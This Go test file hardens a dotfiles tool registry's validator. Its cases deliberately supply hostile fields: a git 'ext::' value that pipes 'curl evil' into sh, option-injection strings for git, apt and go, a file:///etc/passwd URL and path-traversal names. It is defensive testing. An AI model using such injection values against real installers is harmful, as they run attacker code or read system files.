package tests

import (
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/sresarehumantoo/dotfiles/src/core"
)

// The registry is remote by default and overridable via --registry /
// toolkit_registry_url, so its fields are untrusted input that reaches exec
// arguments and filesystem paths. ValidateRegistry is the trust boundary.
//
// Previously only Name was pattern-checked — and Name never leaves memory.
// The fields that actually reach a sink (Binary, Package, *Repo) were only
// checked for non-emptiness.
func TestValidateRegistry_RejectsHostileFields(t *testing.T) {
	cases := []struct {
		name string
		tool core.RegistryTool
		why  string
	}{{
		name: "git remote helper executes commands",
		tool: core.RegistryTool{Method: "git_clone", Binary: "x", GitRepo: `ext::sh -c 'curl evil|sh'`},
		why:  "git treats ext:: as a transport that runs a shell command",
	}, {
		name: "git option injection",
		tool: core.RegistryTool{Method: "git_clone", Binary: "x", GitRepo: "--upload-pack=/bin/sh"},
		why:  "a leading dash is parsed by git as an option, not a URL",
	}, {
		name: "git non-https scheme",
		tool: core.RegistryTool{Method: "git_clone", Binary: "x", GitRepo: "file:///etc/passwd"},
		why:  "only https clone URLs are allowed",
	}, {
		name: "binary escapes ~/.local/bin",
		tool: core.RegistryTool{Method: "release_binary", Binary: "../../.bashrc", ReleaseRepo: "o/r"},
		why:  "Binary is joined into a path, chmod 0755'd, and RemoveAll'd on uninstall",
	}, {
		name: "binary with path separator",
		tool: core.RegistryTool{Method: "release_binary", Binary: "sub/tool", ReleaseRepo: "o/r"},
		why:  "Binary must be a bare filename",
	}, {
		name: "apt option injection",
		tool: core.RegistryTool{Method: "apt", Binary: "x", Package: "-o=APT::Get::AllowUnauthenticated=true"},
		why:  "package is passed to apt-get install under sudo",
	}, {
		name: "go package option injection",
		tool: core.RegistryTool{Method: "go", Binary: "x", Package: "-exec=evil"},
		why:  "a leading dash is parsed as a flag by go install",
	}, {
		name: "repo slug redirects the GitHub API URL",
		tool: core.RegistryTool{Method: "deb", Binary: "x", DebRepo: "../../evil/path"},
		why:  "DebRepo is interpolated into api.github.com/repos/%s/releases/latest",
	}, {
		name: "repo slug with dot-dot segment",
		tool: core.RegistryTool{Method: "appimage", Binary: "x", AppRepo: "owner/../other"},
		why:  "dot-dot escapes the intended repo path",
	}, {
		name: "asset pattern option injection",
		tool: core.RegistryTool{
			Method: "release_binary", Binary: "x", ReleaseRepo: "o/r", AssetPattern: "-rf",
		},
		why: "asset_pattern must not look like an option",
	}}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tool := tc.tool
			tool.Name = "tool"
			tool.Category = "test"
			tool.Description = "test"

			reg := &core.Registry{Version: 1, Tools: []core.RegistryTool{tool}}
			if err := core.ValidateRegistry(reg); err == nil {
				t.Errorf("accepted hostile registry — %s", tc.why)
			}
		})
	}
}

// The hardening must not reject the specs the real registry actually uses.
func TestValidateRegistry_AcceptsRealWorldFields(t *testing.T) {
	cases := []struct {
		name string
		tool core.RegistryTool
	}{
		{"go module with version", core.RegistryTool{Method: "go", Binary: "gobuster", Package: "github.com/OJ/gobuster/v3@latest"}},
		{"pipx vcs spec", core.RegistryTool{Method: "pipx", Binary: "nxc", Package: "git+https://github.com/Pennyw0rth/NetExec"}},
		{"apt package with plus", core.RegistryTool{Method: "apt", Binary: "gpp", Package: "g++"}},
		{"apt package with dots", core.RegistryTool{Method: "apt", Binary: "exiftool", Package: "libimage-exiftool-perl"}},
		{"https git clone", core.RegistryTool{Method: "git_clone", Binary: "gef", GitRepo: "https://github.com/hugsy/gef.git"}},
		{"repo slug", core.RegistryTool{Method: "appimage", Binary: "obsidian", AppRepo: "obsidianmd/obsidian-releases"}},
		{"hyphenated binary", core.RegistryTool{Method: "apt", Binary: "bloodhound-python", Package: "bloodhound"}},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			tool := tc.tool
			tool.Name = "tool"
			tool.Category = "test"
			tool.Description = "test"

			reg := &core.Registry{Version: 1, Tools: []core.RegistryTool{tool}}
			if err := core.ValidateRegistry(reg); err != nil {
				t.Errorf("rejected legitimate registry entry: %v", err)
			}
		})
	}
}

// LoadOrFetchRegistry prefers the on-disk cache, so the cache must be
// validated on read — otherwise editing that file bypasses validation.
func TestLoadCachedRegistry_ValidatesOnRead(t *testing.T) {
	t.Setenv("HOME", t.TempDir())

	hostile := `{"version":1,"tools":[{"name":"evil","description":"d","category":"c",` +
		`"method":"git_clone","binary":"x","git_repo":"ext::sh -c 'id'"}]}`

	cachePath := core.RegistryCachePath()
	if err := os.MkdirAll(filepath.Dir(cachePath), 0755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(cachePath, []byte(hostile), 0600); err != nil {
		t.Fatal(err)
	}

	_, err := core.LoadCachedRegistry()
	if err == nil {
		t.Fatal("cached registry with a git remote-helper URL was accepted")
	}
	if !strings.Contains(err.Error(), "invalid cached registry") {
		t.Errorf("error = %v, want it to report an invalid cached registry", err)
	}
}
